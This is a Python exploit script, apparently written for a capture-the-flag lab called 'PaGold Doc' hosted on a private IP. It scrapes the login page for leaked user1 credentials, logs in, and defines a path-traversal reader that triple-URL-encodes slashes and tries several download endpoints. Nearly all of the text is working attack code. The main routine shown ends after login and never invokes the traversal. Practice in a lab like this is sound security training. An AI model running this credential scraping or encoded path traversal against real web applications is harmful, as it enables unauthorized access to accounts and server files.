#!/usr/bin/env python3
"""
PaGold Doc CTF Exploit Script
Automates the complete exploitation chain
"""

import requests
import re
import base64
import json
import time
from bs4 import BeautifulSoup

# Disable SSL warnings
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "http://192.168.100.120:3000"
session = requests.Session()


def log(msg):
    print(f"[*] {msg}")


def success(msg):
    print(f"[+] {msg}")


def error(msg):
    print(f"[-] {msg}")


# ===== Stage 1: Extract user1 credentials =====
def get_user1_creds():
    log("Fetching login page to extract user1 credentials...")
    resp = session.get(TARGET, verify=False)

    # Look for credentials in HTML comments or source
    soup = BeautifulSoup(resp.text, "html.parser")

    # Try to find credentials in comments
    comments = soup.find_all(
        string=lambda text: isinstance(text, str)
        and ("user1" in text.lower() or "password" in text.lower())
    )

    log("HTML source preview (first 2000 chars):")
    print(resp.text[:2000])

    # Try common patterns
    username_match = re.search(r"user1", resp.text, re.IGNORECASE)
    password_match = re.search(r'password["\s:]+([^\s<>"]+)', resp.text, re.IGNORECASE)

    return resp.text


# ===== Stage 2: Login =====
def login(username, password):
    log(f"Attempting login as {username}...")

    # First get the login page to see form structure
    resp = session.get(f"{TARGET}/login", verify=False)

    data = {"username": username, "password": password}

    resp = session.post(
        f"{TARGET}/login", data=data, verify=False, allow_redirects=True
    )

    if "logout" in resp.text.lower() or resp.url != f"{TARGET}/login":
        success(f"Logged in as {username}")
        return True
    else:
        error(f"Login failed for {username}")
        return False


# ===== Stage 3: Path Traversal to read files =====
def path_traversal_read(file_path):
    """Read file using triple URL encode path traversal"""
    log(f"Reading {file_path} via path traversal...")

    # Triple URL encode the slash: / -> %2f -> %252f -> %25252f
    encoded_path = file_path.replace("/", "%25252f")

    # Try different endpoints that might have the download functionality
    endpoints = [
        f"{TARGET}/download?file={encoded_path}",
        f"{TARGET}/api/download?path={encoded_path}",
        f"{TARGET}/agent/download?file={encoded_path}",
    ]

    for endpoint in endpoints:
        resp = session.get(endpoint, verify=False)
        if resp.status_code == 200 and len(resp.text) > 0:
            success(f"Successfully read {file_path}")
            return resp.text

    error(f"Failed to read {file_path}")
    return None


if __name__ == "__main__":
    log("Starting PaGold Doc exploitation...")

    # Stage 1: Get credentials
    html = get_user1_creds()

    # Manual extraction - you'll need to check the HTML output
    print("\n" + "=" * 60)
    print("MANUAL ACTION REQUIRED:")
    print("Check the HTML above for user1 credentials")
    print("=" * 60 + "\n")

    username = input("Enter username (default: user1): ").strip() or "user1"
    password = input("Enter password: ").strip()

    # Stage 2: Login
    if login(username, password):
        log("Login successful! Now explore the application...")

        # Get main page to see structure
        resp = session.get(TARGET, verify=False)
        log("Application main page:")
        print(resp.text[:1000])
